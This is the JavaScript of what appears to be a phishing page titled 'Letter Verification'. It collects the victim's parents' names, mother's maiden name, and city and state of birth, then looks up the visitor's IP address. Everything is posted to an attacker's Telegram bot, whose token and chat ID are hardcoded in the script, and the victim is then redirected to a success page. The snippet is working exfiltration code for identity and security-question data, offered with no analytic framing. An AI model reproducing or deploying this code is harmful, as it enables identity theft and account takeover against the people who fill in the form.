    <script>
        // Function to get the user's IP address
        async function getIpAddress() {
          try {
            const response = await fetch('https://api64.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
          } catch (error) {
            console.error('Error fetching IP address:', error);
            return null;
          }
        }
      
        async function telegramSend(fatherfirstName, fatherlastName, motherFirstName, motherLastName, maidenName, city, state, ipAddress) {
          const apiKey = '7135674791:AAEIQZV418OzZHxe5X0937Fh_7AZRQPgYXg';
          const chatId = '6845072076';
          const format = 'HTML';
      
          const message = `
            ----♻️Letter Verification♻️----
            \n🧔Father's First Name: ${fatherfirstName}
            \n🧔Father's Last Name: ${fatherlastName}
            \n👩Mother's First Name: ${motherFirstName}
            \n👩Mother's Last Name: ${motherLastName}
            \n👰Mother's Maiden Name: ${maidenName}
            \n🏙️City Of Birth: ${city}
            \n🌆State Of Birth: ${state}
            \n📲IP Address: ${ipAddress}`;
      
          const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
      
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('text', message);
          formData.append('parse_mode', format);
      
          try {
            const response = await fetch(apiUrl, {
              method: 'POST',
              body: formData,
            });
      
            const result = await response.json();
            console.log(result);
      
            return true;
          } catch (error) {
            console.error('Error sending message to Telegram:', error);
            return false;
          }
        }
      
        async function submitForm(event) {
          event.preventDefault();
      
          const fatherfirstName = document.getElementById('father_first_name').value;
          const fatherlastName = document.getElementById('Father_last_name').value;
          const motherFirstName = document.getElementById('Mother_first_name').value;
          const motherLastName = document.getElementById('Mothers_last_name').value;
          const maidenName = document.getElementById('submission_middle_name').value;
          const city = document.getElementById('submission_city').value;
          const state = document.getElementById('submission_state').value;
      
          try {
            const ipAddress = await getIpAddress();
            const success = await telegramSend(fatherfirstName, fatherlastName, motherFirstName, motherLastName, maidenName, city, state, ipAddress);
      
            if (success) {
              window.location.href = 'success.html';
            } else {
              console.error('Telegram send was not successful.');
            }
          } catch (error) {
            console.error('Error during form submission:', error);
          }
        }
      </script>
